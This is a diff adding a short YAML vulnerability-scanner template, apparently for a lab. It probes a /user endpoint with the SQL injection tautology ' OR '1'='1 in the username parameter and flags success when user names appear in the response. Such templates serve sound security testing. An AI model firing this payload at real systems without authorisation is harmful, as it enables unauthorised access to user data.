@@ -1,0 +1,20 @@
+id: sqli-user-endpoint
+info:
+  name: SQL Injection sur /user
+  author: lab
+  severity: high
+  tags: sqli,owasp
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/user?username=%27+OR+%271%27%3D%271"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "alice"
+          - "bob"
+        condition: or
